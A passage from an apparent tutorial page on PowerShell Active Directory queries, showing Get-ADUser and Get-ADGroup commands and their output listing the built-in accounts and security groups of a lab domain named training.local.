class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-500</span><br><span class="line">DistinguishedName  : CN=Administrator,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Administrator</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGuid         : c350d04c-c4d8-4c32-99dc-6426acc0f3e1</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, Enabled, GivenName, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 10</span><br><span class="line"></span><br><span class="line">GivenName          : </span><br><span class="line">Surname            : </span><br><span class="line">UserPrincipalName  : </span><br><span class="line">Enabled            : False</span><br><span class="line">SamAccountName     : Guest</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-501</span><br><span class="line">DistinguishedName  : CN=Guest,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : Guest</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGuid         : c66c9f51-904e-4dd4-a310-39e73c18d1b1</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, Enabled, GivenName, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 10</span><br><span class="line"></span><br><span class="line">GivenName          : </span><br><span class="line">Surname            : </span><br><span class="line">UserPrincipalName  : </span><br><span class="line">Enabled            : False</span><br><span class="line">SamAccountName     : DefaultAccount</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-503</span><br><span class="line">DistinguishedName  : CN=DefaultAccount,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : DefaultAccount</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGuid         : 800aea15-5b31-46c1-bb5f-91f006442c07</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, Enabled, GivenName, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 10</span><br><span class="line"></span><br><span class="line">GivenName          : </span><br><span class="line">Surname            : </span><br><span class="line">UserPrincipalName  : </span><br><span class="line">Enabled            : False</span><br><span class="line">SamAccountName     : krbtgt</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-502</span><br><span class="line">DistinguishedName  : CN=krbtgt,CN=Users,DC=training,DC=local</span><br><span class="line">Name               : krbtgt</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGuid         : 33c297e3-f91d-4c0b-b8ab-9571dd07f85c</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, Enabled, GivenName, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 10</span><br><span class="line"></span><br><span class="line">GivenName          : </span><br><span class="line">Surname            : </span><br><span class="line">UserPrincipalName  : </span><br><span class="line">Enabled            : True</span><br><span class="line">SamAccountName     : AStar</span><br><span class="line">SID                : S-1-5-21-2501991368-4163896689-842069156-1104</span><br><span class="line">DistinguishedName  : CN=AStar Chen,OU=RD Dept,DC=training,DC=local</span><br><span class="line">Name               : AStar Chen</span><br><span class="line">ObjectClass        : user</span><br><span class="line">ObjectGuid         : c116980a-44b9-43de-8adb-05df16472f27</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, Enabled, GivenName, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 10</span><br></pre></td></tr></table></figure>
<p><code>Get-ADUser -Filter * | select SamAccountName</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SamAccountName</span><br><span class="line">--------------</span><br><span class="line">Administrator </span><br><span class="line">Guest         </span><br><span class="line">DefaultAccount</span><br><span class="line">krbtgt        </span><br><span class="line">AStar</span><br></pre></td></tr></table></figure>
<h4 id="Get-ADGroup-filter-or-Get-ADGroup-Identity-lt-SamAccountName-in-Get-ADGroup"><a href="#Get-ADGroup-filter-or-Get-ADGroup-Identity-lt-SamAccountName-in-Get-ADGroup" class="headerlink" title="Get-ADGroup -filter *  (or  Get-ADGroup -Identity  &lt;SamAccountName in Get-ADGroup>)"></a>Get-ADGroup -filter *  (or  Get-ADGroup -Identity  &lt;SamAccountName in Get-ADGroup>)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br></pre></td><td class="code"><pre><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Administrators</span><br><span class="line">SID                : S-1-5-32-544</span><br><span class="line">DistinguishedName  : CN=Administrators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Administrators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 620d2b80-e5dd-4c46-86cc-2e32d5b018ed</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Users</span><br><span class="line">SID                : S-1-5-32-545</span><br><span class="line">DistinguishedName  : CN=Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 73023daa-1801-49c0-9fb4-e4afc31f3e89</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Guests</span><br><span class="line">SID                : S-1-5-32-546</span><br><span class="line">DistinguishedName  : CN=Guests,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Guests</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : dc5b378c-b35a-46e9-9ad1-b8c7cf960746</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Print Operators</span><br><span class="line">SID                : S-1-5-32-550</span><br><span class="line">DistinguishedName  : CN=Print Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Print Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 5af5bf51-669f-42c9-b636-9701f9c0a4d0</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Backup Operators</span><br><span class="line">SID                : S-1-5-32-551</span><br><span class="line">DistinguishedName  : CN=Backup Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Backup Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : c6ca9fee-542a-4076-be29-152c5ea490e2</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Replicator</span><br><span class="line">SID                : S-1-5-32-552</span><br><span class="line">DistinguishedName  : CN=Replicator,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Replicator</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : c5ba5734-f4ee-4477-80aa-e1de05c60f6f</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Remote Desktop Users</span><br><span class="line">SID                : S-1-5-32-555</span><br><span class="line">DistinguishedName  : CN=Remote Desktop Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Remote Desktop Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 18f3ea72-3841-4ff8-8a40-d13db7b5f4b0</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Network Configuration Operators</span><br><span class="line">SID                : S-1-5-32-556</span><br><span class="line">DistinguishedName  : CN=Network Configuration Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Network Configuration Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : f0c018c6-9ac4-47e3-a7dc-0097fab002ed</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Performance Monitor Users</span><br><span class="line">SID                : S-1-5-32-558</span><br><span class="line">DistinguishedName  : CN=Performance Monitor Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Performance Monitor Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 15125e96-1697-42bb-ba08-7aa14071c5be</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Performance Log Users</span><br><span class="line">SID                : S-1-5-32-559</span><br><span class="line">DistinguishedName  : CN=Performance Log Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Performance Log Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : d0a703e1-4005-447a-bc9a-7df4b7521341</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Distributed COM Users</span><br><span class="line">SID                : S-1-5-32-562</span><br><span class="line">DistinguishedName  : CN=Distributed COM Users,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Distributed COM Users</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 51b89cb1-6201-4e27-9572-18b60112fca2</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : IIS_IUSRS</span><br><span class="line">SID                : S-1-5-32-568</span><br><span class="line">DistinguishedName  : CN=IIS_IUSRS,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : IIS_IUSRS</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 2b9aeafd-65c3-44b7-9b3b-4a95273192b6</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 8</span><br><span class="line"></span><br><span class="line">GroupScope         : DomainLocal</span><br><span class="line">GroupCategory      : Security</span><br><span class="line">SamAccountName     : Cryptographic Operators</span><br><span class="line">SID                : S-1-5-32-569</span><br><span class="line">DistinguishedName  : CN=Cryptographic Operators,CN=Builtin,DC=training,DC=local</span><br><span class="line">Name               : Cryptographic Operators</span><br><span class="line">ObjectClass        : group</span><br><span class="line">ObjectGuid         : 2638027b-b108-40fa-92fa-07f123d76fec</span><br><span class="line">PropertyNames      : &#123;DistinguishedName, GroupCategory, GroupScope, Name...&#125;</span><br><span class="line">AddedProperties    : &#123;&#125;</span><br><span class="line">RemovedProperties  : &#123;&#125;</span><br><span class="line">ModifiedProperties : &#123;&#125;</span><br><span class="line">PropertyCount      : 